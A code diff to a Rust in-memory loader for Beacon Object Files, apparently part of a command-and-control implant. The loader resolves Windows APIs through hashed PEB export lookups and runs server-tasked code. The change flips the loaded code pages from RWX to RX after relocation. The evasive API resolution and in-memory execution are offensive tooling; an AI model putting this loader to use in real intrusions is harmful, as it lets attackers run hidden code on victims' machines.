@@ -4,8 +4,9 @@
 //! relocations, and call the entry point.
 //!
 //! Parity decisions against the original (docs/PARITE.md):
-//! - the allocation is one `VirtualAlloc` RWX region (the original splits
-//!   data/code pages and flips the code pages to RX; both documented gaps),
+//! - the code region of the loaded BOF is flipped RWX -> RX after the
+//!   relocations (VirtualProtect, W^X) — the native splits data RW / code RX
+//!   pages; same end state, one allocation,
 //! - async BOFs run sequentially: the started record goes out first, then
 //!   the outputs, then the finished record — no worker thread pool yet,
 //! - `BeaconPrintf` formats through the bounded `bof_format` (no ntdll
@@ -41,6 +42,7 @@ use crate::runtime::bootstrap::Instance;
 // ---------------------------------------------------------------------------
 
 const H_VIRTUAL_ALLOC: u64 = fnv1a64(b"VirtualAlloc");
+const H_VIRTUAL_PROTECT: u64 = fnv1a64(b"VirtualProtect");
 const H_VIRTUAL_FREE: u64 = fnv1a64(b"VirtualFree");
 const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
 const H_CREATE_THREAD: u64 = fnv1a64(b"CreateThread");
@@ -53,6 +55,7 @@ const MEM_RESERVE: u32 = 0x2000;
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RELEASE: u32 = 0x8000;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const PAGE_EXECUTE_READ: u32 = 0x20;
 /// Vararg slots read by the BeaconPrintf shim.
 const PRINTF_SLOTS: usize = 16;
 /// One BeaconPrintf formatted output cap.
@@ -1258,6 +1261,26 @@ unsafe fn load_into(
             r += 1;
         }
         i += 1;
+    }
+
+    // W^X: once the relocations are applied the code region never needs write
+    // again — flip [code_start, total) from RWX to RX (the native runner.c
+    // splits data RW / code RX pages; flipping reaches the same end state
+    // without a second allocation). Data + mapFuncs stay RW. A failed
+    // VirtualProtect degrades to RWX (native behaviour), never fails the BOF.
+    if plan.code_start > 0 && (plan.code_start as usize) < plan.total {
+        let protect = peb::find_export(instance.kernel32, H_VIRTUAL_PROTECT);
+        if !protect.is_null() {
+            let protect: unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32 =
+                core::mem::transmute(protect);
+            let mut old = 0u32;
+            protect(
+                base.add(plan.code_start as usize) as *mut c_void,
+                plan.total - plan.code_start as usize,
+                PAGE_EXECUTE_READ,
+                &mut old,
+            );
+        }
     }
 
     // Entry point: the task names it (the server always sends "go").
